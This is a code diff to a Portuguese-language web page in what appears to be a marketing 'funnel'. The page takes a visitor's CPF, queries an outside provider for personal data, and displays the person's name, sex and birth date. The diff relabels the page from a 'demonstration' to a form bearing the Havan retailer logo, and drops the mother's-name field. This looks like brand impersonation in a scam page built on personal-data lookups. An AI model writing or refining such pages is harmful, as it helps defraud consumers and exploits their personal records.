@@ -140,7 +140,8 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
 <body>
     <!-- Header -->
     <div class="header">
-        <strong>Demonstração de consulta de CPF</strong>
+        <img src="/funil/4/images/havan.png" alt="Logo Havan" style="width:150px; max-width:100%; height:auto; display:block; margin:0 auto 12px;">
+        <strong>Preencha o CPF para consulta</strong>
     </div>
     <!-- Main Content -->
     <div class="main-content">
@@ -168,7 +169,6 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                 <p>Consulta retornada pelo provedor</p>
             </div>
             <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
-            <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p>
             <p><strong>Sexo:</strong> <span id="sexo"></span></p>
             <p><strong>Data de nascimento:</strong> <span id="nascimento">Não informado pelo provedor</span></p>
             <button class="btn-custom" onclick="continuar()">Continuar</button>
@@ -250,8 +250,6 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                         throw new Error("O provedor não retornou um nome válido. Verifique a configuração da API.");
                     }
                     const nomeCompleto = nomeRecebido;
-                    const maeRecebida = typeof responseCPF.MAE === "string" ? responseCPF.MAE.trim() : "";
-                    const nomeMae = maeRecebida && !isCpfValue(maeRecebida) ? maeRecebida : "Não informado pelo provedor";
                     const sexoRecebido = typeof responseCPF.SEXO === "string" ? responseCPF.SEXO.trim().toUpperCase() : "";
                     const sexo = ["M", "MALE", "MASCULINO"].includes(sexoRecebido)
                         ? "MASCULINO"
@@ -260,7 +258,6 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                             : "Não informado pelo provedor";
                     const nascimento = responseCPF.NASCIMENTO || responseCPF.NASC || responseCPF.birth_date || null;
                     document.getElementById("nomeCompleto").innerText = nomeCompleto;
-                    document.getElementById("nomeMae").innerText = nomeMae;
                     document.getElementById("sexo").innerText = sexo;
                     document.getElementById("nascimento").innerText = isCpfValue(String(nascimento || "")) ? "Não informado pelo provedor" : formatarNascimento(nascimento);
                     loader.style.display = "none";
